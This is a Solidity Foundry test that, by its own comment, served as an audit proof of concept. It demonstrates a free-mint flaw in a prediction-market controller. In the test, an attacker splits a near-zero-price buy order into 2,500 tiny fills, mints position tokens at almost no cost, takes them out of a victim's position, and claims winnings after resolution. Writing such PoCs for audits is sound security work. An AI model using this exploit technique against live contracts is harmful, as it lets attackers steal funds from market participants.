// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// NOTE: This Test has been used as PoC to validate the vulnerability (initially marked as invalid) during escalations. 
import {MarketContract} from "../../src/Market/Market.sol";
import {MarketController} from "../../src/Market/MarketController.sol";
import {IMarketController} from "../../src/Market/IMarketController.sol";
import "../../src/Token/PositionTokens.sol";
import "../../src/Market/MarketResolver.sol";
import "../../src/Vault/Vault.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {CommonBase} from "forge-std/Base.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {StdAssertions} from "forge-std/StdAssertions.sol";
import {StdChains} from "forge-std/StdChains.sol";
import {StdCheats, StdCheatsSafe} from "forge-std/StdCheats.sol";
import {StdUtils} from "forge-std/StdUtils.sol";
import {Test, console} from "forge-std/Test.sol";

contract FreeMint is Test {
    MarketContract public marketContract;
	MarketController public marketController;
	PositionTokens public positionTokens;
	MarketResolver public marketResolver;
	Vault public vault;
    ERC20Mock public collateralToken;

    address public owner = makeAddr("owner");
    address public matcher = makeAddr("matcher");

    address public alice;
    address public bob;
    address public david; 

    address public oracle = makeAddr("oracle");
    address public unauthorized = makeAddr("unauthorized");
    address public treasury = makeAddr("treasury");

    bytes32 public questionId = keccak256("BTC_PRICE_BINARY");
    bytes32 public questionId2 = keccak256("ETH_PRICE_BINARY");
    bytes32 public invalidQuestionId = bytes32(0);

    uint256 public constant BINARY_OUTCOMES = 2;
    uint256 public constant MULTI_OUTCOMES = 4;
	uint256 public constant DEFAULT_FEE_RATE = 400; // 4%
	uint256 public constant DEFAULT_TRADE_FEE_RATE = 400; // 4%

    uint256 public privateKeyAlice; 
    uint256 public privateKeyBob; 
    uint256 public privateKeyDavid; 

    bytes32 public merkleRoot1 = keccak256("merkle_root_1");
    bytes32 public merkleRoot2 = keccak256("merkle_root_2");

    function setUp() public {
        vm.startPrank(owner);

        (alice, privateKeyAlice)  = makeAddrAndKey("alice");
        (bob, privateKeyBob ) = makeAddrAndKey("bob");
        (david, privateKeyDavid ) = makeAddrAndKey("david");

		// Deploy collateral token
		collateralToken = new ERC20Mock();

		// Deploy market contract
        MarketContract marketImpl = new MarketContract();
        bytes memory initData_market = abi.encodeWithSelector(MarketContract.initialize.selector, owner);
        marketContract = MarketContract(address(new ERC1967Proxy(address(marketImpl), initData_market)));

		// Deploy position tokens
        PositionTokens positionTokensImpl = new PositionTokens();
        bytes memory initData_positionTokens = abi.encodeWithSelector(PositionTokens.initialize.selector, owner);
        positionTokens = PositionTokens(address(new ERC1967Proxy(address(positionTokensImpl), initData_positionTokens)));

		// Deploy market resolver
        MarketResolver marketResolverImpl = new MarketResolver();
        bytes memory initData_resolver = abi.encodeWithSelector(MarketResolver.initialize.selector, owner, oracle);
        marketResolver = MarketResolver(address(new ERC1967Proxy(address(marketResolverImpl), initData_resolver)));	

		// Deploy market controller
        MarketController marketControllerImpl = new MarketController();
        bytes memory initData_controller = abi.encodeWithSelector(
            MarketController.initialize.selector,
            owner,
            address(positionTokens),
            address(marketResolver),
            address(marketResolver), // momentary bad address
            address(marketContract),
            oracle
        );
        marketController = MarketController(address(new ERC1967Proxy(address(marketControllerImpl), initData_controller)));

		// Deploy Vault 
        Vault vaultImpl = new Vault();
        bytes memory initData_vault =
            abi.encodeWithSelector(Vault.initialize.selector, owner, address(collateralToken), address(marketController));
        vault = Vault(address(new ERC1967Proxy(address(vaultImpl), initData_vault)));

		// Market contract settings
		marketContract.setMarketController(address(marketController));

		// Market controller settings 
        marketController.updateVault(address(vault)); 
        marketController.setAuthorizedMatcher(matcher, true);
        marketController.setAuthorizedMatcher(owner, true);
		marketController.setFeeRate(DEFAULT_FEE_RATE);
		marketController.setTradeFeeRate(DEFAULT_TRADE_FEE_RATE);
        marketController.setTreasury(treasury);
		
		// Position tokens settings
		positionTokens.setMarketController(address(marketController));

        vm.stopPrank();
    }

	 function test_usersAreAbleToMintTokensByUsing0USDC() public {
         // Bob and Alice mint USDC and deposit 100e6 USDC in the vault
        vm.startPrank(bob); 
        deal(address(collateralToken), bob, 100e6); 
        collateralToken.approve(address(vault), 100e6);
        vault.depositCollateral(100e6);
        vm.stopPrank(); 

        vm.startPrank(alice); 
        deal(address(collateralToken), alice, 100e6); 
        collateralToken.approve(address(vault), 100e6);
        vault.depositCollateral(100e6);
        vm.stopPrank(); 

        uint256 BET_AMOUNT = 100e6; 

        // Create market
        vm.startPrank(owner); 
        marketController.createMarket(questionId, 2, block.timestamp + 86400, 0);
        vm.stopPrank(); 


        // Create orders
        IMarketController.Order memory buyOrder = IMarketController.Order({
            user: bob,
            questionId:questionId,
            outcome: 1,
            amount: BET_AMOUNT,
            price: 5000,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: true
        });

        IMarketController.Order memory sellOrder = IMarketController.Order({
            user: alice,
            questionId: questionId,
            outcome: 1,
            amount: BET_AMOUNT,
            price: 5000,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: false
        });        

        // Sign orders
        bytes memory buySignature = signOrder(privateKeyBob, buyOrder);
        bytes memory sellSignature = signOrder(privateKeyAlice, sellOrder);

        vm.startPrank(matcher); 
        // Execute alice and bob orders, in this case they both spend 50e6 USDC.
        marketController.executeOrderMatch(buyOrder, sellOrder, buySignature, sellSignature, BET_AMOUNT);
        vm.stopPrank(); 

        // Then let's say that the price of the outcome 1 (that chosed by bob) drops drastically, until it reaches a price of 2 (so a probability of 0,02%).

        // Then david (the hacker) submits 2500 buy orders with 4000 as fill amount and 2 as price. 
        // With this he is able to mint 10e6 Position Tokens
        // He choices the outcome 1 and bob as the matcher, so bob's tokens will be burned
        uint256 BET_AMOUNT_DAVID = 4000; 
        uint256 DAVID_MAXIMUM_AMOUNT = 4000 * 2500; 
        uint256 PRICE_DAVID = 2; 
          IMarketController.Order memory buyOrder_2 = IMarketController.Order({
            user: david,
            questionId: questionId,
            outcome: 1,
            amount: DAVID_MAXIMUM_AMOUNT,
            price: PRICE_DAVID,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: true
        });

         // Sign orders
        bytes memory buySignature_2 = signOrder(privateKeyDavid, buyOrder_2);       

        // The matcher executes david's orders
        vm.startPrank(matcher); 
        for(uint256 i; i < 2500; i++){
        marketController.executeSingleOrder(buyOrder_2, buySignature_2, BET_AMOUNT_DAVID, bob);
        }

        // David has been able to obtain 10e6 positions tokens
        // Now, at a price of 0,02%, they are currently worth 0,002 USD dollars

        bytes32 conditionId = marketContract.getConditionId(oracle, questionId, 2, 1);
        uint256 tokenId = positionTokens.getTokenId(conditionId, 1);
        // As we can see, david's PT balance is 10e6 while bob's PT balance is 100e6 - 10e6 = 90e6
        assertEq(positionTokens.balanceOf(david, tokenId), 10e6); 
        assertEq(positionTokens.balanceOf(bob, tokenId), 100e6 - 10e6);

        // Now let's assume that the price of the outcome 1 increases again unexpectedly above 50% possibility
        // Market is resolved and......outcome 1 won!
        vm.startPrank(oracle); 
        uint256 outcome = 1;
        bytes32 leaf = keccak256(abi.encodePacked(outcome));
        bytes32 singleLeafRoot = leaf;
        marketResolver.resolveMarketEpoch(questionId, 1, 2, singleLeafRoot);
        vm.stopPrank(); 

        // Now, since the price would be 10.000 (100%), 10e6 position tokens are worth 10 USDC.

        // ClAIM 
        // Let's assume that David claims its rewards before bob and obtain 10e6 USDC.
        vm.startPrank(david); 
        bytes32[] memory proof = new bytes32[](0);
        marketController.claimWinnings(questionId, 1, 1, proof);
        // David's available balance in the Vault is now 10e6 USDC - fees, he has been able to mint this amount for free
        uint256 davidFees = (DEFAULT_FEE_RATE * 10e6) / 10000; 
        assertEq(vault.getAvailableBalance(david),  10e6 - davidFees);
        vm.stopPrank(); 

        // In addiction, we can also see that bob is not able anymore to receive his 100e6 USDC tokens because 10e6 USDC have been already assigned to david.
        // He is able to only receive 90e6 USDC tokens instead of 100e6 USDC.
        vm.startPrank(bob); 
        marketController.claimWinnings(questionId, 1, 1, proof);
        uint256 bobFees = (DEFAULT_FEE_RATE * 90e6) / 10000; 
        // Bob initial balance in the vault was 100e6 USDC, he spent 50e6 USDC for betting, so in the vault he had an additional 50e6 USDC
        uint256 initialBobBalanceMinusPayment = 50e6;
        // This was the initial fee that bob paid when minting tokens
        uint256 initialBobFeeForMintingTokens = (50e6 * DEFAULT_TRADE_FEE_RATE) / 10000; 
        assertEq(vault.getAvailableBalance(bob), (90e6 - bobFees) + initialBobBalanceMinusPayment - initialBobFeeForMintingTokens); 
	 }


	 //// Helper functions for EIP-712 signing
    function getOrderHash(IMarketController.Order memory order) internal view returns (bytes32) {
        bytes32 structHash = keccak256(abi.encode(
            keccak256("Order(address user,bytes32 questionId,uint256 outcome,uint256 amount,uint256 price,uint256 nonce,uint256 expiration,bool isBuyOrder)"),
            order.user,
            order.questionId,
            order.outcome,
            order.amount,
            order.price,
            order.nonce,
            order.expiration,
            order.isBuyOrder
        ));

        bytes32 domainSeparator = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("PredictionMarketOrders"),
            keccak256("1"),
            block.chainid,
            address(marketController)
        ));

        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }

    function signOrder(uint256 privateKey, IMarketController.Order memory order) internal view returns (bytes memory) {
        bytes32 hash = getOrderHash(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hash);
        return abi.encodePacked(r, s, v);
    }


}